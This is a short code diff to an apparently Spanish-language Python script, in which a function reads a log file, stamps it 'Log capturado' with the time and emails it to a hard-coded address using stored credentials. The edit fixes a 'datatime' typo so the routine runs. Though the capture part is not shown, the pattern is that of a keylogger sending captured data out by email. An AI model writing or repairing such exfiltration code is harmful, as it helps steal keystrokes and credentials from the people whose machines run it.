@@ -34,8 +34,8 @@ def SendEmail(user,pasw,destino, subject, boody):
         print ('Error al mandar correo')
 
 def FormatAndSendLogEmail():
-        f= open(file_log, 'r')
-        adate = datatime.datatime.now().strftime("%Y-%m-%d %H:%M:%S")
+        f= open(file_log, 'r+')
+        adate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         data = f.read().replace('\n','')
         data = 'Log capturado a las: '+ adate + '\n' + data
         SendEmail(email, passw, email,'Nuevo log - ' + adate, data)
